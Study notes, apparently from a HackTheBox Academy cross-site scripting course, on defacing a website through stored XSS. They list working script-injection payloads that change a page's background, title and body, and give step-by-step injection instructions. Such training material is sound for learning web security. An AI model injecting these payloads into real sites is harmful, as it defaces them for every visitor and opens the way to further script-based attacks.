## ID
401

## Module
Cross-Site Scripting (XSS)

## Kind
notes

## Title
Section 6 — Defacing

## Description
Exploits stored XSS to permanently change a web page’s appearance — background, title, and content — simulating a website defacement.

## Tags
xss, defacing, stored-xss, javascript, html

## Commands
- `<script>document.body.style.background = "#141d2b"</script>`
- `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>`
- `<script>document.title = 'HackTheBox Academy'</script>`
- `<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>`

## What This Section Covers
Website defacing via stored XSS allows you to permanently alter how a page appears to every visitor. By injecting JavaScript that modifies the DOM, you can change the background, title, and body text, effectively replacing the original content with your own message or brand.

## Methodology
1. Identify a stored XSS vulnerability (e.g., a to-do list that saves input without sanitisation).
2. Change the background: inject `<script>document.body.style.background = "#141d2b"</script>` (or use `document.body.background` with an image URL).
3. Change the page title: inject `<script>document.title = 'HackTheBox Academy'</script>`.
4. Replace the page text:
   - Prepare a minified HTML string with the desired message (e.g., a centered `<h1>` and `<p>` with an image).
   - Inject `<script>document.getElementsByTagName('body')[0].innerHTML = '<your-minified-html>'</script>`.
5. Verify by refreshing the page; all visitors now see the defaced version.

## Multi-step Workflow (optional)

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|xss]]  
← [[05-xss-discovery]] | [[07-xss-phishing]] →
<!-- AUTO-LINKS-END -->
